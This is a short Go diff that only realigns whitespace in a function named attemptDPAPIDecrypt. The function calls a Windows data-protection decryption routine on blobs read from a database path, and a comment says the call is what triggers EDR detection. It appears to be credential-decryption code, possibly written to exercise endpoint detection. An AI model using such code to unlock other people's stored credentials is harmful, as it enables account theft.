@@ -393,11 +393,11 @@ func attemptDPAPIDecrypt(dbPath string) string {
 	// The API call itself is what triggers EDR detection
 	ret, _, err := procDecrypt.Call(
 		uintptr(unsafe.Pointer(&inBlob)),  // pDataIn
-		0,                                  // ppszDataDescr
-		0,                                  // pOptionalEntropy
-		0,                                  // pvReserved
-		0,                                  // pPromptStruct
-		0,                                  // dwFlags
+		0,                                 // ppszDataDescr
+		0,                                 // pOptionalEntropy
+		0,                                 // pvReserved
+		0,                                 // pPromptStruct
+		0,                                 // dwFlags
 		uintptr(unsafe.Pointer(&outBlob)), // pDataOut
 	)
 
